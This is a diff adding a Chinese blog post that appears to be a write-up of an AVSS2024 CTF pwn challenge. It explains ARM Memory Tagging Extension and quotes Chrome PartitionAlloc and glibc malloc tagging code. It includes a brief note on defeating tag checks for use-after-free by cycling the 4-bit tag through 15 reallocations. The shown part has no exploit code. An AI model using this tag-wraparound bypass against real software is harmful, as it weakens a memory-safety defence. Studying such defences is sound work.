@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>AVSS2024 初赛 MTE 复现 |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-AVSS2024 - MTE"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  AVSS2024 初赛 MTE 复现
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/AVSS2024%20-%20MTE/" class="article-date">
+  <time datetime="2024-05-30T16:00:00.000Z" itemprop="datePublished">2024-05-31</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/%E5%BA%94%E7%94%A8%E5%B1%82/">应用层</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">14 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>MTE机制的学习.感觉目前的实现还是有很多利用空间.<br>快进到”再见了,所有的内存漏洞”</p>
+<span id="more"></span>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2023/08/mte-as-implemented-part-1.html">https://googleprojectzero.blogspot.com/2023/08/mte-as-implemented-part-1.html</a><br><a target="_blank" rel="noopener" href="https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Arm_Memory_Tagging_Extension_Whitepaper.pdf">https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Arm_Memory_Tagging_Extension_Whitepaper.pdf</a><br><a target="_blank" rel="noopener" href="https://www.darknavy.org/blog/strengthening_the_shield_mte_in_memory_allocators/">https://www.darknavy.org/blog/strengthening_the_shield_mte_in_memory_allocators/</a></p>
+<p>ARMv8架构地址具有Top-Byte Ignore特性,MTE使用指针的高四位来存储tag.指针的tag必须与将要访问的内存的tag相同才可以访问,否则SIGSEGV.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405301159021.png"></p>
+<p>下面是为支持MTE提供的三条指令:<br>irg(insert random tag): 为指针x0生成随机的tag并保存到x1.<br>stg(Store Allocation Tag): 将x1中的tag应用到对应内存中.<br>ldr(Load Register): 读取内存</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; x0 is a pointer</span><br><span class="line">irg  x1, x0</span><br><span class="line">stg  x1, [x1]</span><br><span class="line">ldr  x0, [x1]</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="Chrome-PartitionAlloc"><a href="#Chrome-PartitionAlloc" class="headerlink" title="Chrome - PartitionAlloc"></a>Chrome - PartitionAlloc</h3><p>谷歌的PartitionAlloc在释放内存时会将tag++,导致UAF的指针不能再次访问对应内存.<br>但实际上由于tag仅有4位,只需再释放取出15次即可使tag与UAF的指针的tag相同.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* retagged_slot_start = internal::TagMemoryRangeIncrement(</span><br><span class="line">    ObjectToTaggedSlotStart(object), tag_size);</span><br><span class="line"><span class="comment">// Incrementing the MTE-tag in the memory range invalidates the |object|'s</span></span><br><span class="line"><span class="comment">// tag, so it must be retagged.</span></span><br><span class="line">object = TaggedSlotStartToObject(retagged_slot_start);</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Glibc-Ptmalloc"><a href="#Glibc-Ptmalloc" class="headerlink" title="Glibc - Ptmalloc"></a>Glibc - Ptmalloc</h3><p>关于MTE与实现的简介:</p>
+<p>glibc将用户可用空间标记为与堆块头不同的tag,这可以快速检测简单的堆溢出.<br>当内存释放,内存会被glibc默认的tag所标记,这可以防止UAF.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Memory tagging.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Some systems support the concept of tagging (sometimes known as</span></span><br><span class="line"><span class="comment">   coloring) memory locations on a fine grained basis.  Each memory</span></span><br><span class="line"><span class="comment">   location is given a color (normally allocated randomly) and</span></span><br><span class="line"><span class="comment">   pointers are also colored.  When the pointer is dereferenced, the</span></span><br><span class="line"><span class="comment">   pointer's color is checked against the memory's color and if they</span></span><br><span class="line"><span class="comment">   differ the access is faulted (sometimes lazily).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   We use this in glibc by maintaining a single color for the malloc</span></span><br><span class="line"><span class="comment">   data structures that are interleaved with the user data and then</span></span><br><span class="line"><span class="comment">   assigning separate colors for each block allocation handed out.  In</span></span><br><span class="line"><span class="comment">   this way simple buffer overruns will be rapidly detected.  When</span></span><br><span class="line"><span class="comment">   memory is freed, the memory is recolored back to the glibc default</span></span><br><span class="line"><span class="comment">   so that simple use-after-free errors can also be detected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   If memory is reallocated the buffer is recolored even if the</span></span><br><span class="line"><span class="comment">   address remains the same.  This has a performance impact, but</span></span><br><span class="line"><span class="comment">   guarantees that the old pointer cannot mistakenly be reused (code</span></span><br><span class="line"><span class="comment">   that compares old against new will see a mismatch and will then</span></span><br><span class="line"><span class="comment">   need to behave as though realloc moved the data to a new location).</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>内部所使用的API,实际上是一层Wrapper.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Internal API for memory tagging support.</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">   void *tag_new_zero_region (void *ptr, size_t size)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Allocates a new tag, colors the memory with that tag, zeros the</span></span><br><span class="line"><span class="comment">   memory and returns a pointer that is correctly colored for that</span></span><br><span class="line"><span class="comment">   location.  The non-tagging version will simply call memset with 0.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   void *tag_region (void *ptr, size_t size)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Color the region of memory pointed to by PTR and size SIZE with</span></span><br><span class="line"><span class="comment">   the color of PTR.  Returns the original pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   void *tag_new_usable (void *ptr)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Allocate a new random color and use it to color the user region of</span></span><br><span class="line"><span class="comment">   a chunk; this may include data from the subsequent chunk's header</span></span><br><span class="line"><span class="comment">   if tagging is sufficiently fine grained.  Returns PTR suitably</span></span><br><span class="line"><span class="comment">   recolored for accessing the memory there.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   void *tag_at (void *ptr)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Read the current color of the memory at the address pointed to by</span></span><br><span class="line"><span class="comment">   PTR (ignoring it's current color) and return PTR recolored to that</span></span><br><span class="line"><span class="comment">   color.  PTR must be valid address in all other respects.  When</span></span><br><span class="line"><span class="comment">   tagging is not enabled, it simply returns the original pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_MTAG</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> mtag_enabled = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> mtag_mmap_flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_enabled false</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_mmap_flags 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_region (ptr, size);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_zero_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_zero_region (__libc_mtag_new_tag (ptr), size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span> (ptr, <span class="number">0</span>, size);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_usable</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled) &amp;&amp; ptr)</span><br><span class="line">    {</span><br><span class="line">      mchunkptr cp = mem2chunk(ptr);</span><br><span class="line">      ptr = __libc_mtag_tag_region (__libc_mtag_new_tag (ptr), memsize (cp));</span><br><span class="line">    }</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_at</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Convert address P to a pointer that is tagged correctly for that</span></span><br><span class="line"><span class="comment">   location.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line">__libc_mtag_address_get_tag (<span class="type">void</span> *p)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">register</span> <span class="type">void</span> *x0 <span class="title function_">asm</span> <span class="params">(<span class="string">"x0"</span>)</span> = p;</span><br><span class="line">  <span class="keyword">asm</span> (<span class="string">".inst 0xd9600000 /* ldg x0, [x0] */"</span> : <span class="string">"+r"</span> (x0));</span><br><span class="line">  <span class="keyword">return</span> x0;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Assign a new (random) tag to a pointer P (does not adjust the tag on</span></span><br><span class="line"><span class="comment">   the memory addressed).  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line">__libc_mtag_new_tag (<span class="type">void</span> *p)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">register</span> <span class="type">void</span> *x0 <span class="title function_">asm</span> <span class="params">(<span class="string">"x0"</span>)</span> = p;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">unsigned</span> <span class="type">long</span> x1 <span class="title function_">asm</span> <span class="params">(<span class="string">"x1"</span>)</span>;</span><br><span class="line">  <span class="comment">/* Guarantee that the new tag is not the same as now.  */</span></span><br><span class="line">  <span class="keyword">asm</span> (<span class="string">".inst 0x9adf1401 /* gmi x1, x0, xzr */\n"</span></span><br><span class="line">       <span class="string">".inst 0x9ac11000 /* irg x0, x0, x1 */"</span> : <span class="string">"+r"</span> (x0), <span class="string">"=r"</span> (x1));</span><br><span class="line">  <span class="keyword">return</span> x0;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#ifdef USE_MTAG</span><br><span class="line"></span><br><span class="line">/* Assumptions:</span><br><span class="line"> *</span><br><span class="line"> * ARMv8-a, AArch64, MTE, LP64 ABI.</span><br><span class="line"> *</span><br><span class="line"> * Interface contract:</span><br><span class="line"> * Address is 16 byte aligned and size is multiple of 16.</span><br><span class="line"> * Returns the passed pointer.</span><br><span class="line"> * The memory region may remain untagged if tagging is not enabled.</span><br><span class="line"> */</span><br><span class="line">	.arch armv8.5-a</span><br><span class="line">	.arch_extension memtag</span><br><span class="line"></span><br><span class="line">#define dstin	x0</span><br><span class="line">#define count	x1</span><br><span class="line">#define dst	x2</span><br><span class="line">#define dstend	x3</span><br><span class="line">#define tmp	x4</span><br><span class="line">#define zva_val	x4</span><br><span class="line"></span><br><span class="line">ENTRY (__libc_mtag_tag_region)</span><br><span class="line">	PTR_ARG (0)</span><br><span class="line">	SIZE_ARG (1)</span><br><span class="line"></span><br><span class="line">	add	dstend, dstin, count</span><br><span class="line"></span><br><span class="line">	cmp	count, 96</span><br><span class="line">	b.hi	L(set_long)</span><br><span class="line"></span><br><span class="line">	tbnz	count, 6, L(set96)</span><br><span class="line"></span><br><span class="line">	/* Set 0, 16, 32, or 48 bytes.  */</span><br><span class="line">	lsr	tmp, count, 5</span><br><span class="line">	add	tmp, dstin, tmp, lsl 4</span><br><span class="line">	cbz     count, L(end)</span><br><span class="line">	stg	dstin, [dstin]</span><br><span class="line">	stg	dstin, [tmp]</span><br><span class="line">	stg	dstin, [dstend, -16]</span><br><span class="line">L(end):</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.p2align 4</span><br><span class="line">	/* Set 64..96 bytes.  Write 64 bytes from the start and</span><br><span class="line">	   32 bytes from the end.  */</span><br><span class="line">L(set96):</span><br><span class="line">	st2g	dstin, [dstin]</span><br><span class="line">	st2g	dstin, [dstin, 32]</span><br><span class="line">	st2g	dstin, [dstend, -32]</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.p2align 4</span><br><span class="line">	/* Size is &gt; 96 bytes.  */</span><br><span class="line">L(set_long):</span><br><span class="line">	cmp	count, 160</span><br><span class="line">	b.lo	L(no_zva)</span><br><span class="line"></span><br><span class="line">#ifndef SKIP_ZVA_CHECK</span><br><span class="line">	mrs	zva_val, dczid_el0</span><br><span class="line">	and	zva_val, zva_val, 31</span><br><span class="line">	cmp	zva_val, 4		/* ZVA size is 64 bytes.  */</span><br><span class="line">	b.ne	L(no_zva)</span><br><span class="line">#endif</span><br><span class="line">	st2g	dstin, [dstin]</span><br><span class="line">	st2g	dstin, [dstin, 32]</span><br><span class="line">	bic	dst, dstin, 63</span><br><span class="line">	sub	count, dstend, dst	/* Count is now 64 too large.  */</span><br><span class="line">	sub	count, count, 128	/* Adjust count and bias for loop.  */</span><br><span class="line"></span><br><span class="line">	.p2align 4</span><br><span class="line">L(zva_loop):</span><br><span class="line">	add	dst, dst, 64</span><br><span class="line">	dc	gva, dst</span><br><span class="line">	subs	count, count, 64</span><br><span class="line">	b.hi	L(zva_loop)</span><br><span class="line">	st2g	dstin, [dstend, -64]</span><br><span class="line">	st2g	dstin, [dstend, -32]</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">L(no_zva):</span><br><span class="line">	sub	dst, dstin, 32		/* Dst is biased by -32.  */</span><br><span class="line">	sub	count, count, 64	/* Adjust count for loop.  */</span><br><span class="line">L(no_zva_loop):</span><br><span class="line">	st2g	dstin, [dst, 32]</span><br><span class="line">	st2g	dstin, [dst, 64]!</span><br><span class="line">	subs	count, count, 64</span><br><span class="line">	b.hi	L(no_zva_loop)</span><br><span class="line">	st2g	dstin, [dstend, -64]</span><br><span class="line">	st2g	dstin, [dstend, -32]</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">END (__libc_mtag_tag_region)</span><br><span class="line">#endif /* USE_MTAG */</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对chunk2mem,mem2chunk的操作也加上了tag_at的调用.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Convert a chunk address to a user mem pointer and extract the right tag.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem_tag(p) ((void*)tag_at ((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert a user mem pointer to a chunk address and extract the right tag.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>实际的标记过程在__libc_malloc中实现.正常分配堆块然后调用tag_new_usable对用户可用部分进行标记.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> IS_IN (libc)</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">{</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">"PTRDIFF_MAX is not more than half of SIZE_MAX"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes = checked_request2size (bytes);</span><br><span class="line">  <span class="keyword">if</span> (tbytes == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">    }</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    {</span><br><span class="line">      victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  victim = tag_new_usable (victim);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在__libc_free中解除标记.在解除之前,访问一次mem来确保tag正确.</p>
